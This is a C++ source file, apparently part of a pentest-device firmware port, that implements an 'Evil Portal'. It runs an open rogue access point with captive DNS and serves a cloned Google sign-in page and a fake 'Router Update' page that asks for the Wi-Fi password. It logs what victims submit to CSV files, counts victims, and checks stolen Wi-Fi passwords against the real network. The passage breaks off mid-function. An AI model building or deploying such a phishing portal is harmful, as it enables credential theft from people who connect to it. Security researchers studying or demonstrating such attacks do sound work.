/*
 * SPDX-FileCopyrightText: 2026 Bruce CardputerZero Community
 *
 * SPDX-License-Identifier: AGPL-3.0-only
 *
 * Evil Portal, Linux port of the ESP32 Bruce feature. The web side (routes,
 * pages, capture format) is a verbatim port of pr3y/Bruce
 * src/modules/wifi/evil_portal.cpp; the radio side maps the ESP32 APIs onto
 * the Linux tools the Wi-Fi menu already uses:
 *
 *   WiFi.softAPConfig/softAP   -> ip addr + hostapd (open AP)
 *   DNSServer.start(53, "*",)  -> dnsmasq address=/#/<gateway> (captive:
 *                                 every name resolves to us, unknown paths
 *                                 serve the portal)
 *   WiFi.begin() verify        -> stop AP, wpa_supplicant attempt (8 x 500ms
 *                                 like verifyCreds), restart AP - one radio
 *                                 cannot do AP+STA concurrently here.
 */

#include "evil_portal.h"

#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/stat.h>

#include <algorithm>
#include <cerrno>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <fstream>
#include <sstream>

#if defined(__linux__)
#include <csignal>
#include <dirent.h>
#include <pwd.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>
#endif

namespace platform {
namespace {

// ---------------------------------------------------------------------------
// small string helpers
// ---------------------------------------------------------------------------

std::string trim(const std::string& s) {
    const size_t a = s.find_first_not_of(" \t\r\n");
    if (a == std::string::npos) return "";
    const size_t b = s.find_last_not_of(" \t\r\n");
    return s.substr(a, b - a + 1);
}

bool starts_with(const std::string& s, const char* prefix) {
    return s.rfind(prefix, 0) == 0;
}

int hex_val(char c) {
    if (c >= '0' && c <= '9') return c - '0';
    if (c >= 'a' && c <= 'f') return c - 'a' + 10;
    if (c >= 'A' && c <= 'F') return c - 'A' + 10;
    return -1;
}

// Escape an SSID/password for a hostapd/wpa_supplicant double-quoted string.
std::string conf_quote(const std::string& s) {
    std::string out;
    for (char c : s) {
        if (c == '"' || c == '\\') out.push_back('\\');
        if (c == '\n' || c == '\r') continue; // newlines would inject config lines
        out.push_back(c);
    }
    return out;
}

// ---------------------------------------------------------------------------
// Bruce's pages (verbatim from src/modules/wifi/evil_portal.cpp)
// ---------------------------------------------------------------------------

// Shared by the default Google page and getHtmlTemplate().
constexpr const char* kBruceCss =
    "a:hover{text-decoration: underline;}body{font-family: Arial, sans-serif;align-items: center;"
    "justify-content: center;background-color: #FFFFFF;}input[type='text'], "
    "input[type='password']{width: 100%;padding: 12px 10px;margin: 8px 0;box-sizing: "
    "border-box;border: 1px solid #cccccc;border-radius: 4px;}.container{margin: auto;padding: "
    "20px;max-width: 700px;}.logo-container{text-align: center;margin-bottom: 30px;display: "
    "flex;justify-content: center;align-items: center;}.logo{width: 40px;height: 40px;fill: "
    "#FFC72C;margin-right: 100px;}.company-name{font-size: 42px;color: black;margin-left: "
    "0px;}.form-container{background: #FFFFFF;border: 1px solid #CEC0DE;border-radius: "
    "4px;padding: 20px;box-shadow: 0px 0px 10px 0px rgba(108, 66, 156, 0.2);}h1{text-align: "
    "center;font-size: 28px;font-weight: 500;margin-bottom: 20px;}.input-field{width: "
    "100%;padding: 12px;border: 1px solid #BEABD3;border-radius: 4px;margin-bottom: "
    "20px;font-size: 14px;}.submit-btn{background: #0b57d0;color: white;border: "
    "none;padding: 12px 20px;border-radius: 4px;font-size: 0.875rem;}.submit-btn:hover{background: "
    "#0e4eb3;}.forgot-btn{background: transparent;color: #0b57d0;border-radius: 8px;border: "
    "none;font-size: 14px;cursor: pointer;}.forgot-btn:hover{background-color: "
    "rgba(11,87,208,0.08);}.containerlogo{padding-top: 25px;}.containertitle{color: "
    "#202124;font-size: 24px;padding: 15px 0px 10px 0px;}.containersubtitle{color: "
    "#202124;font-size: 16px;padding: 0px 0px 30px 0px;}.containerbtn{display: "
    "flex;justify-content: end;padding: 30px 0px 25px 0px;}@media screen and (min-width: "
    "768px){.logo{max-width: 80px;max-height: 80px;}}";

} // namespace

const char* default_portal_html() {
    // loadDefaultHtml(): "Sign in: Google Accounts" portal (default_creds.csv).
    static const std::string page =
        std::string("<!DOCTYPE html><html><head><title>Sign in: Google Accounts</title><meta "
                    "charset='UTF-8'><meta name='viewport' content='width=device-width, "
                    "initial-scale=1.0'><style>") +
        kBruceCss + "</style></head><body><div class='container'><div class='logo-container'><?xml "
                    "version='1.0' standalone='no'?><!DOCTYPE svg PUBLIC '-//W3C//DTD SVG "
                    "20010904//EN' "
                    "'http://www.w3.org/TR/2001/REC-SVG-20010904/DTD/svg10.dtd'></div><div "
                    "class=form-container><center><div class='containerlogo'><!-- Google Logo --><div "
                    "id='logo' title='Google'><svg viewBox='0 0 75 24' width='75' height='24' "
                    "xmlns='http://www.w3.org/2000/svg' aria-hidden='true'><g id='qaEJec'><path "
                    "fill='#ea4335' d='M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-.495-1.33-2.008-3.79-5.102-3.79-3.068 "
                    "0-5.622 2.41-5.622 5.96 0 3.34 2.53 5.96 5.92 5.96 2.73 "
                    "0 4.31-1.67 4.97-2.64l-2.03-1.35c-.673.98-1.6 1.64-2.93 1.64zm-.203-7.27c1.04 "
                    "0 1.92.52 2.21 1.264l-5.32 2.21c-.06-2.3 1.79-3.474 3.12-3.474z'></path></g><g "
                    "id='YGlOvc'><path fill='#34a853' d='M58.193.67h2.564v17.44h-2.564z'></path></g><g "
                    "id='BWfIk'><path fill='#4285f4' d='M54.152 8.066h-.088c-.588-.697-1.716-1.33-3.136-1.33-2.98 "
                    "0-5.71 2.614-5.71 5.98 0 3.338 2.73 5.933 5.71 5.933 1.42 0 2.548-.64 3.136-1.36h.088v.86c0 "
                    "2.28-1.217 3.5-3.183 3.5-1.61 0-2.6-1.15-3-2.12l-2.28.94c.65 1.58 2.39 3.52 5.28 3.52 3.06 "
                    "0 5.66-1.807 5.66-6.206V7.21h-2.48v.858zm-3.006 8.237c-1.804 0-3.318-1.513-3.318-3.588 "
                    "0-2.1 1.514-3.635 3.318-3.635 1.784 0 3.183 1.534 3.183 3.635 0 2.075-1.4 3.588-3.19 "
                    "3.588z'></path></g><g id='e6m3fd'><path fill='#fbbc05' d='M38.17 6.735c-3.28 "
                    "0-5.953 2.506-5.953 5.96 0 3.432 2.673 5.96 5.954 5.96 3.29 0 5.96-2.528 5.96-5.96 "
                    "0-3.46-2.67-5.96-5.95-5.96zm0 9.568c-1.798 0-3.348-1.487-3.348-3.61 "
                    "0-2.14 1.55-3.608 3.35-3.608s3.348 1.467 3.348 3.61c0 2.116-1.55 3.608-3.35 "
                    "3.608z'></path></g><g id='vbkDmc'><path fill='#ea4335' d='M25.17 6.71c-3.28 "
                    "0-5.954 2.505-5.954 5.958 0 3.433 2.673 5.96 5.954 5.96 3.282 0 5.955-2.527 5.955-5.96 "
                    "0-3.453-2.673-5.96-5.955-5.96zm0 9.567c-1.8 0-3.35-1.487-3.35-3.61 "
                    "0-2.14 1.55-3.608 3.35-3.608s3.35 1.46 3.35 3.6c0 2.12-1.55 3.61-3.35 "
                    "3.61z'></path></g><g id='idEJde'><path fill='#4285f4' d='M14.11 "
                    "14.182c.722-.723 1.205-1.78 1.387-3.334H9.423V8.373h8.518c.09.452.16 1.07.16 1.664 "
                    "0 1.903-.52 4.26-2.19 5.934-1.63 1.7-3.71 2.61-6.48 2.61-5.12 0-9.42-4.17-9.42-9.29C0 "
                    "4.17 4.31 0 9.43 0c2.83 0 4.843 1.108 6.362 2.56L14 4.347c-1.087-1.02-2.56-1.81-4.577-1.81-3.74 "
                    "0-6.662 3.01-6.662 6.75s2.93 6.75 6.67 6.75c2.43 0 3.81-.972 4.69-1.856z'></path></g></svg></div><!-- "
                    "/Google Logo --></div></center><div style='min-height: 150px'><center><div "
                    "class='containertitle'>Sign in</div><div class='containersubtitle'>Use your "
                    "Google Account</div></center><form action='/post' id='login-form'><input name='email' "
                    "class='input-field' type='text' placeholder='Email or phone' required><input name='password' "
                    "class='input-field' type='password' placeholder='Enter your password' required /><div "
                    "class='containermsg'><button class='forgot-btn'>Forgot password?</button></div><div "
                    "class='containerbtn'><button id=submitbtn class=submit-btn "
                    "type=submit>Next</button></div></form></div></div></div></body></html>";
    return page.c_str();
}

const char* verify_portal_html() {
    // loadDefaultHtml_one(): "Router Update" page; the form posts the Wi-Fi
    // password to /post after a fake 5s countdown (default_creds_1.csv).
    static const std::string page = R"HTML(<!DOCTYPE html><html lang='en'><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width, initial-scale=1.0'><title>Router Update</title><style>body {font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;background-color: #d3d3d3; /* Cinza mais escuro */display: flex;justify-content: center;align-items: center;height: 100vh;margin: 0;padding: 10px;box-sizing: border-box;}.container {background-color: white;padding: 20px;border-radius: 10px;box-shadow: 0 0 15px rgba(0, 0, 0, 0.2);text-align: center;max-width: 360px;width: 100%;}.container svg {width: 70px;height: 70px;fill: #ff1744; /* Cor de alerta */margin-bottom: 20px;}h1 {color: #333;font-size: 22px;margin-bottom: 15px;}p {color: #666;font-size: 15px;margin-bottom: 20px;}input[type='password'] {width: 100%;padding: 12px;margin: 10px 0;border-radius: 5px;border: 1px solid #ccc;font-size: 16px;box-sizing: border-box;}button {width: 100%;padding: 12px;background-color: #007bff;color: white;border: none;border-radius: 5px;cursor: pointer;font-size: 16px;transition: background-color 0.3s;}button:hover {background-color: #0056b3;}div#success-block{display: none;text-align: center;min-height: 60px;margin-bottom: 30px;justify-content: center;align-items: center;}</style></head><body><div class='container'><!-- Ícone No Signal em SVG --><svg xmlns='http://www.w3.org/2000/svg' fill='#000000' width='800px' height='800px' viewBox='0 -1 26 26'><path fill-opacity='.3' d='M24.24 8l1.35-1.68C25.1 5.96 20.26 2 13 2S.9 5.96.42 6.32l12.57 15.66.01.02.01-.01L20 13.28V8h4.24z'/><path d='M22 22h2v-2h-2v2zm0-12v8h2v-8h-2z'/></svg><h1>Router Update</h1><div id='form-block'><p>Router firmware update required. Enter your Wi-Fi password to update.</p><form id='submit-form' action='/post'><input type='password' name='password' placeholder='Wi-Fi network password' required><button type='submit'>Update</button></form></div><div id='success-block'><p>The router will restart in <span id='span-count' style='font-weight: bolder;'>5</span></p></div></div><script>document.getElementById('submit-form').addEventListener('submit', function(event) {event.preventDefault();document.getElementById('success-block').style.display = 'flex';document.getElementById('form-block').style.display = 'none';setInterval(function() {index = parseInt(document.getElementById('span-count').textContent)if (index > 1) {document.getElementById('span-count').textContent = index-1;index--;} else {document.getElementById('submit-form').submit();}}, 1000);});</script></body></html>)HTML";
    return page.c_str();
}

const char* wifi_load_html() {
    // wifiLoadPage(): animated Wi-Fi logo shown after a capture ("connecting...").
    static const std::string page = R"HTML(<!DOCTYPE html><html><head> <meta charset='UTF-8'> <meta name='viewport' content='width=device-width, initial-scale=1.0'> </style></head><body> <div class='container'> <div class='logo-container'> <?xml version='1.0' standalone='no'?> <!DOCTYPE svg PUBLIC '-//W3C//DTD SVG 20010904//EN' 'http://www.w3.org/TR/2001/REC-SVG-20010904/DTD/svg10.dtd'> </div> <div> <div> <div id='logo' title='Wifi' style='display: flex;justify-content: center;max-width: 50%;margin: auto;'> <svg fill='#000000' height='800px' width='800px' version='1.1' id='Capa_1' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' viewBox='0 0 365.892 365.892' xml:space='preserve'> <g> <circle cx='182.945' cy='286.681' r='41.494'/> <path id='p1' d='M182.946,176.029c-35.658,0-69.337,17.345-90.09,46.398c-5.921,8.288-4.001,19.806,4.286,25.726 c3.249,2.321,6.994,3.438,10.704,3.438c5.754,0,11.423-2.686,15.021-7.724c13.846-19.383,36.305-30.954,60.078-30.954 c23.775,0,46.233,11.571,60.077,30.953c5.919,8.286,17.437,10.209,25.726,4.288c8.288-5.92,10.208-17.438,4.288-25.726 C252.285,193.373,218.606,176.029,182.946,176.029z'/> <path id='p2' d='M182.946,106.873c-50.938,0-99.694,21.749-133.77,59.67c-6.807,7.576-6.185,19.236,1.392,26.044 c3.523,3.166,7.929,4.725,12.32,4.725c5.051-0.001,10.082-2.063,13.723-6.116c27.091-30.148,65.849-47.439,106.336-47.439 s79.246,17.291,106.338,47.438c6.808,7.576,18.468,8.198,26.043,1.391c7.576-6.808,8.198-18.468,1.391-26.043 C282.641,128.621,233.883,106.873,182.946,106.873z'/> <path id='p3' d='M360.611,112.293c-47.209-48.092-110.305-74.577-177.665-74.577c-67.357,0-130.453,26.485-177.664,74.579 c-7.135,7.269-7.027,18.944,0.241,26.079c3.59,3.524,8.255,5.282,12.918,5.281c4.776,0,9.551-1.845,13.161-5.522 c40.22-40.971,93.968-63.534,151.344-63.534c57.379,0,111.127,22.563,151.343,63.532c7.136,7.269,18.812,7.376,26.08,0.242 C367.637,131.238,367.745,119.562,360.611,112.293z'/> </g> </svg> </div> </div> </div> </div> <script> const paths = document.querySelectorAll('path'); let index = 0; function showNextPath() { if (index < paths.length) { paths[index].style.display = 'block'; index++; } } function hideAllPaths() { paths.forEach(path => { path.style.display = 'none'; }); index = 0; } hideAllPaths(); setInterval(function() { if (index < paths.length) { showNextPath(); } else { hideAllPaths(); } }, 1000); </script></body></html>)HTML";
    return page.c_str();
}

std::string portal_template(const std::string& ap_name, const std::string& body) {
    // getHtmlTemplate(): Bruce's portal-styled wrapper, <title> = AP name.
    return "<!DOCTYPE html>"
           "<html>"
           "<head>"
           "  <title>" +
           ap_name +
           "</title>"
           "  <meta charset='UTF-8'>"
           "  <meta name='viewport' content='width=device-width, initial-scale=1.0'>"
           "  <style>" +
           kBruceCss +
           "</style>"
           "</head>"
           "<body>"
           "  <div class='container'>"
           "    <div class='logo-container'>"
           "      <?xml version='1.0' standalone='no'?>"
           "      <!DOCTYPE svg PUBLIC '-//W3C//DTD SVG 20010904//EN' "
           "'http://www.w3.org/TR/2001/REC-SVG-20010904/DTD/svg10.dtd'>"
           "    </div>"
           "    <div class=form-container>"
           "      <div style='min-height: 150px'>" +
           body +
           "      </div>"
           "    </div>"
           "  </div>"
           "</body>"
           "</html>";
}

std::string creds_page(const std::string& ap_name, const std::string& captured_html) {
    return portal_template(
        ap_name,
        "<ol>" + captured_html +
            "</ol><br><center><p><a style=\"color:blue\" href=/>Back to Index</a></p><p><a "
            "style=\"color:blue\" href=/clear>Clear passwords</a></p></center>");
}

std::string ssid_page(const std::string& ap_name) {
    return portal_template(
        ap_name,
        "<p>Set a new SSID for Evil Portal:</p><form action='/postssid' id='login-form'><input "
        "name='ssid' class='input-field' type='text' placeholder='" +
            ap_name + "' required><button id=submitbtn class=submit-btn type=submit>Apply</button></div></form>");
}

std::string ssid_post_page(const std::string& ap_name) {
    return portal_template(
        ap_name, "Evil Portal shutting down and restarting with SSID <b>" + ap_name +
                     "</b>. Please reconnect.");
}

// ---------------------------------------------------------------------------
// pure helpers
// ---------------------------------------------------------------------------

std::string url_decode(const std::string& s) {
    std::string out;
    out.reserve(s.size());
    for (size_t i = 0; i < s.size(); ++i) {
        if (s[i] == '+') {
            out.push_back(' ');
        } else if (s[i] == '%' && i + 2 < s.size()) {
            const int hi = hex_val(s[i + 1]);
            const int lo = hex_val(s[i + 2]);
            if (hi >= 0 && lo >= 0) {
                out.push_back(static_cast<char>((hi << 4) | lo));
                i += 2;
                continue;
            }
            out.push_back(s[i]);
        } else {
            out.push_back(s[i]);
        }
    }
    return out;
}

bool is_noise_key(const std::string& key) {
    // credsController()'s skip list: tracking/noise params real portals send.
    if (key == "q" || key == "P1" || key == "P2" || key == "P3" || key == "P4") return true;
    return starts_with(key, "cup2") || starts_with(key, "plain");
}

std::vector<std::pair<std::string, std::string>> parse_form_args(const std::string& encoded) {
    std::vector<std::pair<std::string, std::string>> out;
    size_t pos = 0;
    while (pos <= encoded.size()) {
        size_t amp = encoded.find('&', pos);
        if (amp == std::string::npos) amp = encoded.size();
        const std::string pair_str = encoded.substr(pos, amp - pos);
        if (!pair_str.empty()) {
            const size_t eq = pair_str.find('=');
            if (eq != std::string::npos) {
                out.emplace_back(url_decode(pair_str.substr(0, eq)),
                                 url_decode(pair_str.substr(eq + 1)));
            } else {
                out.emplace_back(url_decode(pair_str), "");
            }
        }
        if (amp == encoded.size()) break;
        pos = amp + 1;
    }
    return out;
}

namespace {

std::vector<std::pair<std::string, std::string>> filter_noise(
    const std::vector<std::pair<std::string, std::string>>& args) {
    std::vector<std::pair<std::string, std::string>> out;
    for (const auto& kv : args) {
        if (!is_noise_key(kv.first)) out.push_back(kv);
    }
    return out;
}

} // namespace

std::string csv_line(const std::vector<std::pair<std::string, std::string>>& args) {
    // Bruce: csvLine += key + ": " + value, comma-separated ("email: x,password: y").
    std::string out;
    for (const auto& kv : filter_noise(args)) {
        if (!out.empty()) out += ",";
        out += kv.first + ": " + kv.second;
    }
    return out;
}

std::string captured_li(const std::vector<std::pair<std::string, std::string>>& args) {
    // Bruce: htmlResponse = "<li>" + per-arg "key: value<br>\n" + "</li>\n".
    std::string out = "<li>";
    for (const auto& kv : filter_noise(args)) {
        out += kv.first + ": " + kv.second + "<br>\n";
    }
    out += "</li>\n";
    return out;
}

std::string last_cred_text(const std::vector<std::pair<std::string, std::string>>& args) {
    // Bruce's lastCred: key.substring(0, 3) + ": " + value per line ("ema: x").
    std::string out;
    for (const auto& kv : filter_noise(args)) {
        out += kv.first.substr(0, 3) + ": " + kv.second + "\n";
    }
    return out;
}

std::string parse_ap_tag(const std::string& html) {
    // loadCustomHtml(): read the first line, extract <!-- AP="Name" -->.
    const size_t nl = html.find('\n');
    const std::string first_line = trim(html.substr(0, nl == std::string::npos ? html.size() : nl));
    const std::string marker = "<!-- AP=\"";
    const size_t start = first_line.find(marker);
    if (start == std::string::npos) return "";
    const size_t name_start = start + marker.size();
    const size_t end = first_line.find("\" -->", name_start);
    if (end == std::string::npos) return "";
    return first_line.substr(name_start, end - name_start);
}

HttpRequest parse_http_request(const std::string& raw) {
    HttpRequest req;
    const size_t body_sep = raw.find("\r\n\r\n");
    const std::string head = raw.substr(0, body_sep == std::string::npos ? raw.size() : body_sep);
    std::string body = body_sep == std::string::npos ? "" : raw.substr(body_sep + 4);

    std::istringstream lines(head);
    std::string request_line;
    std::getline(lines, request_line);
    if (!request_line.empty() && request_line.back() == '\r') request_line.pop_back();

    // "METHOD /path?query HTTP/1.1"
    std::istringstream rl(request_line);
    rl >> req.method;
    std::string target;
    rl >> target;
    size_t content_length = 0;
    std::string header;
    while (std::getline(lines, header)) {
        if (!header.empty() && header.back() == '\r') header.pop_back();
        std::istringstream h(header);
        std::string name;
        std::getline(h, name, ':');
        name = trim(name);
        std::string value;
        std::getline(h, value);
        if (strcasecmp(name.c_str(), "Content-Length") == 0) {
            content_length = static_cast<size_t>(strtoul(trim(value).c_str(), nullptr, 10));
        }
    }
    if (body.size() > content_length) body.resize(content_length);

    const size_t query = target.find('?');
    req.path = query == std::string::npos ? target : target.substr(0, query);
    if (query != std::string::npos) {
        auto query_args = parse_form_args(target.substr(query + 1));
        req.args.insert(req.args.end(), query_args.begin(), query_args.end());
    }
    if (!body.empty()) {
        auto body_args = parse_form_args(body);
        req.args.insert(req.args.end(), body_args.begin(), body_args.end());
    }
    return req;
}

// ---------------------------------------------------------------------------
// config generators
// ---------------------------------------------------------------------------

std::string hostapd_conf(const std::string& iface, const std::string& ssid, int channel) {
    // Open AP. driver=nl80211 is mandatory: without it hostapd falls back to
    // the legacy driver and refuses to start (the old menu entry's bug).
    std::string conf;
    conf += "driver=nl80211\n";
    conf += "interface=" + iface + "\n";
    conf += "ssid=" + conf_quote(ssid) + "\n";
    if (channel > 0) conf += "channel=" + std::to_string(channel) + "\n";
    conf += "hw_mode=g\n";
    conf += "auth_algs=1\n";
    conf += "wmm_enabled=0\n";
    conf += "logger_syslog=-1\n";
    return conf;
}

std::string dnsmasq_conf(const std::string& iface, const std::string& gateway) {
    // DHCP tells clients we are router+DNS; address=/#/gw answers every lookup
    // with the gateway (ESP32: dnsServer.start(53, "*", apIp)) so all captive
    // probes land on the portal. The lease range starts above the gateway.
    const std::string base = gateway.substr(0, gateway.rfind('.'));
    return "interface=" + iface + "\n"
                                 "bind-interfaces\n"
                                 "except-interface=lo\n"
                                 "no-resolv\n"
                                 "dhcp-authoritative\n"
                                 "leasefile=/tmp/bruce-portal/dnsmasq.leases\n"
                                 "dhcp-range=" +
           base + ".10," + base +
           ".50,255.255.255.0,12h\n"
           "dhcp-option=3," +
           gateway + "\n"
                     "dhcp-option=6," +
           gateway + "\n"
                     "address=/#/" +
           gateway + "\n";
}

std::string wpa_conf(const std::string& ssid, const std::string& password) {
    return "ctrl_interface=DIR=/var/run/wpa_supplicant GROUP=netdev\n"
           "network={\n"
           "    ssid=\"" +
           conf_quote(ssid) +
           "\"\n"
           "    psk=\"" +
           conf_quote(password) +
           "\"\n"
           "}\n";
}

// ---------------------------------------------------------------------------
// route table (Bruce's setupRoutes + CaptiveRequestHandler + controllers)
// ---------------------------------------------------------------------------

namespace {

HttpResponse make_html(const std::string& body) {
    return HttpResponse{200, body};
}

void save_csv(const PortalOptions& opts, const std::string& file_name, const std::string& line) {
    if (opts.creds_dir.empty() || file_name.empty()) return;
    const std::string dir = opts.creds_dir + "/BruceEvilCreds";
    ::mkdir(opts.creds_dir.c_str(), 0755);
    ::mkdir(dir.c_str(), 0755);
    std::ofstream f(dir + "/" + file_name, std::ios::app);
    if (f) f << line << "\n";
}

std::string arg_value(const HttpRequest& req, const std::string& key) {
    for (const auto& kv : req.args) {
        if (kv.first == key) return kv.second;
    }
    return "";
}

} // namespace

HttpResponse portal_handle_request(const HttpRequest& req, PortalOptions& opts, PortalState& state,
                                  const PortalHooks& hooks) {
    const std::string path =
        !req.path.empty() && req.path.back() == '/' && req.path.size() > 1
            ? req.path.substr(0, req.path.size() - 1) // tolerate "/post/"
            : req.path;

    // Bruce's CaptiveRequestHandler: "/" -> portal, "/post" -> capture,
    // "/creds"/"/ssid" -> views, "/postssid" -> live SSID change, and any
    // other URL becomes a capture when it carries args, else the portal.
    if (path == "/post") {
        const std::string password = arg_value(req, "password");
        state.captured_html = captured_li(req.args) + state.captured_html;
        state.last_cred = last_cred_text(req.args);
        state.victims++;

        if (opts.verify_mode && !password.empty()) {
            // Bruce: respond with the "connecting" animation, then try the
            // stolen password against the real network and log valid true/false.
            const bool valid = hooks.verify_password ? hooks.verify_password(opts, password) : false;
            save_csv(opts, opts.ap_name + "_creds.csv",
                     csv_line(req.args) + (valid ? ", valid: true" : ", valid: false"));
            return make_html(wifi_load_html());
        }
        save_csv(opts, opts.output_file, csv_line(req.args));
        return make_html(wifi_load_html());
    }

    if (path == "/creds") {
        return make_html(creds_page(opts.ap_name, state.captured_html));
    }
    if (path == "/ssid") {
        return make_html(ssid_page(opts.ap_name));
    }
    if (path == "/postssid") {
        const std::string new_ssid = arg_value(req, "ssid");
        if (!new_ssid.empty()) opts.ap_name = new_ssid;
        if (hooks.on_ap_restart) hooks.on_ap_restart(opts);
        state.victims = 0; // Bruce restartWiFi(reset=true) resets the counter
        return make_html(ssid_post_page(opts.ap_name));
    }
    if (path == "/" || path.empty()) {
        return make_html(opts.html_page);
    }
    if (!req.args.empty()) {
        // onNotFound with args -> capture ( portals POST to arbitrary paths).
        HttpRequest post = req;
        post.path = "/post";
        return portal_handle_request(post, opts, state, hooks);
    }
    return make_html(opts.html_page);
}

// ---------------------------------------------------------------------------
// `--evil-portal` entry point
// ---------------------------------------------------------------------------

#if defined(__linux__)

namespace {

volatile sig_atomic_t g_stop = 0;
int g_listen_fd = -1;
void on_signal(int) {
    g_stop = 1;
    // accept() would otherwise be restarted (glibc's default SA_RESTART);
    // shutdown() is async-signal-safe and unblocks it for a clean exit.
    if (g_listen_fd >= 0) {
        ::shutdown(g_listen_fd, SHUT_RDWR);
    }
}

// Run a fixed shell command (never user text; SSIDs go into config files only).
void run(const std::string& cmd) { std::system(cmd.c_str()); }

bool file_exists(const std::string& path) {
    struct stat st{};
    return ::stat(path.c_str(), &st) == 0;
}

bool valid_iface(const std::string& iface) {
    if (iface.empty() || iface.size() > 15) return false;
    for (char c : iface) {
        if (!(std::isalnum(static_cast<unsigned char>(c)) || c == '.' || c == '_' || c == '-')) {
            return false;
        }
    }
    return true;
}

bool valid_ip(const std::string& ip) {
    in_addr addr{};
    return inet_pton(AF_INET, ip.c_str(), &addr) == 1;
}

std::string autodetect_iface() {
    if (DIR* d = opendir("/sys/class/net")) {
        std::string first;
        while (dirent* e = readdir(d)) {
            const std::string name = e->d_name;
            if (name == "." || name == "..") continue;
            if (file_exists("/sys/class/net/" + name + "/wireless")) {
                closedir(d);
                return name;
            }
            if (first.empty()) first = name;
        }
        closedir(d);
    }
    return "wlan0";
}

std::string home_dir() {
    // Under the sudo self-escalation $HOME is root's; captures and custom
    // portals belong to the invoking user, so follow SUDO_USER when present.
    if (const char* user = std::getenv("SUDO_USER"); user && user[0]) {
        if (const passwd* pw = ::getpwnam(user);
            pw && pw->pw_dir && pw->pw_dir[0]) {
            return pw->pw_dir;
        }
    }
    if (const char* h = std::getenv("HOME"); h && h[0]) return h;
    return "/root";
}

void read_file(const std::string& path, std::string& out) {
    std::ifstream in(path, std::ios::binary);
    std::ostringstream ss;
    ss << in.rdbuf();
    out = ss.str();
}

void write_file(const std::string& path, const std::string& content) {
    std::ofstream f(path, std::ios::trunc);
    f << content;
}

const char* kWorkDir = "/tmp/bruce-portal";

void kill_pidfile(const char* name) {
    const std::string pid_path = std::string(kWorkDir) + "/" + name + ".pid";
    std::ifstream in(pid_path);
    long pid = 0;
    if (in >> pid && pid > 1) {
        char cmd[64];
        std::snprintf(cmd, sizeof(cmd), "kill -9 %ld 2>/dev/null", pid);
        run(cmd);
    }
    ::remove(pid_path.c_str());
}

void stop_ap_services() {
    kill_pidfile("hostapd");
    kill_pidfile("dnsmasq");
}

void start_ap_services(const PortalOptions& opts, const std::string& iface) {
    run("ip addr replace " + opts.gateway + "/24 dev " + iface + " 2>/dev/null");
    run("ip link set " + iface + " up 2>/dev/null");
    write_file(std::string(kWorkDir) + "/hostapd.conf",
               hostapd_conf(iface, opts.ap_name, opts.channel));
    write_file(std::string(kWorkDir) + "/dnsmasq.conf", dnsmasq_conf(iface, opts.gateway));
    run("hostapd -B -P " + std::string(kWorkDir) + "/hostapd.pid " + kWorkDir +
        "/hostapd.conf 2>&1");
    run("dnsmasq -C " + std::string(kWorkDir) + "/dnsmasq.conf --pid-file=" + kWorkDir +
        "/dnsmasq.pid 2>&1");
}

// Linux equivalent of Bruce's verifyCreds(): with one radio we must drop the
// AP for the ~4s the connect attempt takes, then bring the portal back up.
bool verify_live(const PortalOptions& opts, const std::string& password, const std::string& iface) {
    stop_ap_services();
    write_file(std::string(kWorkDir) + "/wpa.conf", wpa_conf(opts.ap_name, password));
    run("wpa_supplicant -B -i " + iface + " -c " + kWorkDir + "/wpa.conf -P " + kWorkDir +
        "/wpa.pid 2>/dev/null");
    bool connected = false;
    for (int i = 0; i < 8 && !connected; ++i) { // Bruce: 8 x 500ms, 4s max
        usleep(500000);
        FILE* p = popen(("wpa_cli -i " + iface + " status 2>/dev/null").c_str(), "r");
        if (p) {
            char buf[2048];
            const size_t n = fread(buf, 1, sizeof(buf) - 1, p);
            buf[n] = '\0';
            pclose(p);
            if (strstr(buf, "wpa_state=COMPLETED") != nullptr) connected = true;
        }
    }
    kill_pidfile("wpa");
    run("ip addr flush dev " + iface + " 2>/dev/null"); // drop the STA lease
    start_ap_services(opts, iface);
    return connected;
}

int parse_int(const char* s, int fallback) {
    if (!s || !s[0]) return fallback;
    char* end = nullptr;
    const long v = std::strtol(s, &end, 10);
    return (end && *end == '\0') ? static_cast<int>(v) : fallback;
}

void usage() {
    std::printf("usage: bruce_cardputerzero --evil-portal <mode> [args...]\n"
                "  default [ssid]         Google portal AP (Bruce 'Default')\n"
                "  verify  [ssid]         Router-Update portal + password check\n"
                "  custom  <file> [ssid]  portal HTML from file; first line\n"
                "                         <!-- AP=\"Name\" --> names the AP\n"
                "  clone   <ssid> [chan]  clone a scanned AP ('Clone Portal')\n"
                "options: --gateway IP (default 192.168.4.1) --iface DEV --channel N\n");
}

int serve_portal(PortalOptions opts, const std::string& iface) {
    PortalState state;
    PortalHooks hooks;
    hooks.on_ap_restart = [&opts, iface](const PortalOptions& o) {
        stop_ap_services();
        opts = o;
        start_ap_services(opts, iface);
        std::printf("[*] AP restarted as '%s'\n", opts.ap_name.c_str());
    };
    hooks.verify_password = [&opts, iface](const PortalOptions& o, const std::string& password) {
        std::printf("[*] verifying password against '%s' (AP pauses a few seconds)...\n",
                    o.ap_name.c_str());
        const bool ok = verify_live(o, password, iface);
        std::printf(ok ? "[+] password VALID for '%s'\n" : "[-] password invalid for '%s'\n",
                    o.ap_name.c_str());
        return ok;
    };

    // NetworkManager would fight us for the interface (deauth/scan/re-associate).
    run("systemctl stop NetworkManager 2>/dev/null");
    run("killall wpa_supplicant 2>/dev/null");
    start_ap_services(opts, iface);

    if (!file_exists(std::string(kWorkDir) + "/hostapd.pid")) {
        std::printf("error: hostapd failed to start (apt install hostapd; "
                    "disable Monitor mode / other APs on %s first)\n",
                    iface.c_str());
        run("systemctl start NetworkManager 2>/dev/null");
        return 1;
    }

    // HTTP captive portal on :80, bound to the gateway address.
    const int listen_fd = ::socket(AF_INET, SOCK_STREAM, 0);
    if (listen_fd < 0) {
        std::printf("error: socket: %s\n", std::strerror(errno));
        return 1;
    }
    int one = 1;
    setsockopt(listen_fd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
    sockaddr_in addr{};
    addr.sin_family = AF_INET;
    addr.sin_port = htons(80);
    if (inet_pton(AF_INET, opts.gateway.c_str(), &addr.sin_addr) != 1 ||
